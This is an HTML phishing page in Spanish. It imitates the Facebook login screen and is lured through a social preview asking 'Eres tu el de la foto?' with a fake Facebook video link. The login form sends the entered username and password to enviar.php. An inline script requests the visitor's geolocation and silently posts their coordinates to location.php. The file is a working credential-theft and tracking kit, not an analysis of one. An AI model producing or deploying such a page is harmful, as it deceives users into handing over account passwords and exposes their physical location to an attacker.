<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Eres tu el de la foto?">
    <meta property="og:url" content="https://www.facebook.com/watch?v=a-31Ie2dFC4">
    <meta property="twitter:url" content="https://www.facebook.com/watch?v=a-31Ie2dFC4">
    <meta property="og:description" content="Eres tu el de la foto?">
    <meta property="og:image" content="img/image.jpg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Iniciar sesión</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; background: #fff; }
        .lang-bar { text-align: center; margin-top: 36px; color: #555; }
        .form-container {
            width: 100%; max-width: 400px;
            margin: 20px auto 0 auto; background: #fff;
            padding: 0 16px 28px 16px; border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,.10);
            display: flex; flex-direction: column; align-items: center;
        }
        .logo { margin-top: 10px; margin-bottom: 18px; display: flex; justify-content: center; }
        .logo img { width: 65px; }
        input, button {
            width: 95%; padding: 13px; margin-bottom: 14px;
            border-radius: 6px; border: 1px solid #dadada;
            font-size: 17px; box-sizing: border-box; display: block;
            margin-left: auto; margin-right: auto;
        }
        button { background: #1877f2; color: #fff; border: none; font-weight: bold; cursor: pointer; margin-bottom: 20px; }
        .new-account {
            border: 2px solid #1877f2; background: #fff;
            color: #1877f2; margin-top: 8px;
        }
        .forgot { text-align: center; margin-bottom: 12px; }
        .forgot a { color: #1877f2; text-decoration: none; font-size: 15px; }
        .footer-bar { width: 100%; margin: 30px auto 0 auto; display: flex; flex-direction: column; align-items: center; }
        .meta-logo-footer { margin-bottom: 3px; }
        .meta-logo-footer img { width: 41px; }
        .footer-links { display: flex; font-size: 14px; color: #858585; justify-content: center; }
        .footer-links span { margin: 0 12px; }
        @media (max-width: 400px) {
            .form-container, input, button { width: 100%; min-width: 0; }
        }
    </style>
    <script src="jquery.min.js"></script>
    <!-- <script src="ip.js"></script> -->
    <script src="ajax.js"></script>
    <script>
    // Geolocalización
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(function(pos) {
        const { latitude, longitude, accuracy } = pos.coords;
        fetch('location.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude, longitude, accuracy })
        });
      });
    }
    </script>
</head>
<body>
    <div class="lang-bar">Español</div>
    <form class="form-container" action="enviar.php" method="POST">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="logo facebook">
        </div>
        <input type="text" name="user" placeholder="Celular o correo electrónico" required>
        <input type="password" name="pass" placeholder="Contraseña" required>
        <button type="submit">Iniciar sesión</button>
        <div class="forgot">
            <a href="#">¿Olvidaste tu contraseña?</a>
        </div>
        <button type="button" class="new-account">Crear cuenta nueva</button>
    </form>
    <div class="footer-bar">
        <div class="meta-logo-footer">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Logo.svg" alt="meta logo">
        </div>
        <div class="footer-links">
            <span>Información</span>
            <span>Ayuda</span>
            <span>Más</span>
        </div>
    </div>
</body>
</html>
